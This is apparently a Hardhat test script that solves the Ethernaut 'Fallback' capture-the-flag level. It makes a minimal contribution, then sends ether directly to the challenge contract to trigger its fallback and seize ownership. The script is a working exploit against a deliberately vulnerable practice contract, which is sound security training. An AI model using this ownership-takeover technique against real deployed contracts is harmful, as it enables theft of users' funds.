const { expect } = require("chai");
const { Contract, Signer } = require("ethers");
const { ethers } = require("hardhat");
const { createChallenge, submitLevel } = require("./utils");

const abi = [
  {
    inputs: [],
    stateMutability: "nonpayable",
    type: "constructor",
  },
  {
    stateMutability: "payable",
    type: "fallback",
  },
  {
    inputs: [],
    name: "contribute",
    outputs: [],
    stateMutability: "payable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "",
        type: "address",
      },
    ],
    name: "contributions",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "getContribution",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "owner",
    outputs: [
      {
        internalType: "address payable",
        name: "",
        type: "address",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "withdraw",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
];

before(async () => {
  console.log(`running fallback test`);
  [eoa] = await ethers.getSigners();
  challengeAddress = createChallenge(
    `0x465f1E2c7FFDe5452CFe92aC3aa1230B76B2B1CB`
  );
  challenge = await ethers.getContractAt(abi, challengeAddress);
});

it("solves the challenge", async () => {
  //Send ether less than 0.001 to contribute
  const tx = await challenge.contribute({
    from: eoa.address,
    value: ethers.utils.parseUnits("0.0000000000001", "ether"),
    gasLimit: 10000000,
  });
  const txReceipt = await tx.wait(1);
  console.log(`txReceipt: ${JSON.stringify(txReceipt)}`);
  console.log(`address: ${JSON.stringify(eoa.address)}`);
  const dict = await challenge.contributions(eoa.address);
  console.log(`dict: ${JSON.stringify(dict)}`);
  const owner = await challenge.owner();
  console.log(`current owner: ${JSON.stringify(owner)}`);

  const sendEther = await eoa.sendTransaction({
    to: challengeAddress,
    value: ethers.utils.parseUnits("0.0000000000001", "ether"),
  });
  const newOwner = await challenge.owner();
  console.log(`new owner: ${JSON.stringify(newOwner)}`);
});
